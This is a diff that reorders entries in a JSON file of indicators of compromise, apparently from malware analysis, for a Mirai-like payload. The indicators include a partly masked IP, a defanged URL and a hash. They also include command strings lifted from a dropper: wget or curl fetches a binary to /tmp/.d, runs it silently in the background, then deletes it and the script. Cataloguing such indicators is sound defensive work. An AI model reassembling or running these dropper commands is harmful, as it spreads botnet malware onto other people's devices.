@@ -1,33 +1,33 @@
 [
   {
-    "context": "Embedded IP in payload",
-    "source": "static_analysis",
-    "type": "ip",
-    "value": "80.96.112.XXX"
-  },
-  {
     "context": "Embedded URL in payload",
     "source": "strings",
     "type": "url",
     "value": "hxxp://$S:$P/$BIN"
   },
   {
-    "context": "Payload hash (mirai-like)",
+    "context": "Embedded IP in payload",
     "source": "static_analysis",
-    "type": "hash",
-    "value": "37a369285464f8de9c6c0f415202a1a2db7dc526614fb961420b48d10979a242"
-  },
-  {
-    "context": "Suspicious command pattern",
-    "source": "strings",
-    "type": "command",
-    "value": "/tmp/.d </dev/null >/dev/null 2>&1 &"
+    "type": "ip",
+    "value": "80.96.112.XXX"
   },
   {
     "context": "Suspicious command pattern",
     "source": "strings",
     "type": "command",
     "value": "# Try wget, curl, busybox wget"
+  },
+  {
+    "context": "Suspicious command pattern",
+    "source": "strings",
+    "type": "command",
+    "value": "wget -q hxxp://$S:$P/$BIN -O /tmp/.d 2>/dev/null || \\"
+  },
+  {
+    "context": "Suspicious command pattern",
+    "source": "strings",
+    "type": "command",
+    "value": "curl -s -o /tmp/.d hxxp://$S:$P/$BIN 2>/dev/null || \\"
   },
   {
     "context": "Suspicious command pattern",
@@ -45,7 +45,7 @@
     "context": "Suspicious command pattern",
     "source": "strings",
     "type": "command",
-    "value": "curl -s -o /tmp/.d hxxp://$S:$P/$BIN 2>/dev/null || \\"
+    "value": "/tmp/.d </dev/null >/dev/null 2>&1 &"
   },
   {
     "context": "Suspicious command pattern",
@@ -54,10 +54,10 @@
     "value": "rm -f /tmp/.d $0"
   },
   {
-    "context": "Suspicious command pattern",
-    "source": "strings",
-    "type": "command",
-    "value": "wget -q hxxp://$S:$P/$BIN -O /tmp/.d 2>/dev/null || \\"
+    "context": "Payload hash (mirai-like)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "37a369285464f8de9c6c0f415202a1a2db7dc526614fb961420b48d10979a242"
   },
   {
     "relation": "source_url",
